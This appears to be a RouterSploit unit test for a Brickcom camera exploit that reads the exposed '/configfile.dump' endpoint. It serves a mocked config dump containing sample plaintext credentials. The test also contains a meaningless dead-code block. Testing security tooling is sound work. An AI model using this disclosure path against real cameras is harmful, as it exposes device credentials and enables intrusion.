from routersploit.modules.exploits.cameras.brickcom.corp_network_cameras_conf_disclosure import Exploit
configfile = 'DeviceBasicInfo.firmwareVersion=v3.0.6.12DeviceBasicInfo.macAddress=00:00:00:00:00:00DeviceBasicInfo.sensorID=OV9X11DeviceBasicInfo.internalName=BrickcomDeviceBasicInfo.productName=Di-1092AXDeviceBasicInfo.displayName=CB-1092AXDeviceBasicInfo.modelNumber=XXXDeviceBasicInfo.companyName=Brickcom CorporationDeviceBasicInfo.comments=[CUBE HD IPCam STREEDM]DeviceBasicInfo.companyUrl=www.brickcom.comDeviceBasicInfo.serialNumber=AXNB02B211111DeviceBasicInfo.skuType=LITDeviceBasicInfo.ledIndicatorMode=1DeviceBasicInfo.minorFW=1DeviceBasicInfo.hardwareVersion=DeviceBasicInfo.PseudoPDseProdNum=P3301AudioDeviceSetting.muted=0UserSetSetting.userList.size=2UserSetSetting.userList.users0.index=0UserSetSetting.userList.users0.password=MyM4st3rP4ssUserSetSetting.userList.users0.privilege=1UserSetSetting.userList.users0.username=Cam_UserUserSetSetting.userList.users1.index=0UserSetSetting.userList.users1.password=C0mm0mP4ss'

def test_check_v1_success(target):
    if False:
        i = 10
        return i + 15
    ' Test scenario - successful check via method 1 '
    route_mock = target.get_route_mock('/configfile.dump', methods=['GET'])
    route_mock.return_value = configfile
    exploit = Exploit()
    assert exploit.target == ''
    assert exploit.port == 80
    exploit.target = target.host
    exploit.port = target.port
    assert exploit.check()
    assert exploit.run() is None